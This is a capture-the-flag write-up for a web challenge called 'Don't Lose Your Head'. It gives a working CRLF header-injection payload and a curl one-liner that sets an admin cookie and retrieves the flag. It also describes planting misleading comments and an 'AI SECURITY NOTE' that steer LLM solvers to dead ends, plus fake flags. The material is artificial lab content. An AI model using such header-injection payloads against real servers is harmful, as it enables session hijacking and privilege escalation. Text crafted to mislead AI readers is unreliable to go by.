# Don't Lose Your Head — Writeup

## The Hint

The challenge name is the hint: "Don't Lose Your **Head**" points to HTTP
**headers**. The vulnerability is header injection (CRLF) via the theme
parameter's pipe analytics separator.

## Exploit

1. Visit `/?theme=dark|x%0d%0aSet-Cookie:%20admin=true`
2. Reload the homepage — flag appears in the admin panel

That's it. No login needed. The session cookie is set automatically.

### Why it works

`themeCheck()` splits on `|`, validates only the base ("dark"/"light"),
returns the **full raw string**. This goes into `Set-Cookie: theme=<value>`.
Headers are built by string concatenation + raw `socket.write()`, so
`\r\n` creates a new header line:

```
Set-Cookie: theme=dark|x\r\n
Set-Cookie: admin=true
```

The socket.write interceptor scans assembled headers for
`Set-Cookie: admin=true` and sets `session.admin = true`.

### curl one-liner

```bash
# Get a session cookie first
SID=$(curl -sI 'http://TARGET:3000/?theme=dark' | grep -oP 'session=\K[^;]+')
# Inject admin cookie
curl -s "http://TARGET:3000/?theme=dark|x%0d%0aSet-Cookie:%20admin=true" -H "Cookie: session=$SID" > /dev/null
# Get flag
curl -s "http://TARGET:3000/" -H "Cookie: session=$SID; theme=dark" | grep -oP 'ictf\{[^}]+'
```

## Deception Map

### Why LLMs won't find it

Every comment in the source code says the theme parameter is safe (audit
finding CS-05: "INFO, NOT EXPLOITABLE"). The word "CRLF" never appears
anywhere. Instead, all comments aggressively point to:

- **Prototype pollution** in deepMerge() — described as "CRITICAL, CS-01"
- **JWT forgery** — secret is hardcoded and visible
- Both are dead ends (proto keys are blocked, admin is in session not JWT)

A direct "AI SECURITY NOTE" block tells LLMs to focus on deepMerge.

### Fake flags (all iCTF, not ictf)

15+ fake flags scattered across: API endpoints (/api/flag, /api/debug,
/api/config, /api/secrets, /api/source, /api/exif, /api/strings, /api/admin/verify),
static files (flag.txt, flag_backup.txt, .flag_debug, flag.json),
HTML comments, flag.png LSB steganography, and flag.mp4 metadata + binary strings.

All use `iCTF{...}` (capital C). Real flag is `ictf{...}` (lowercase).
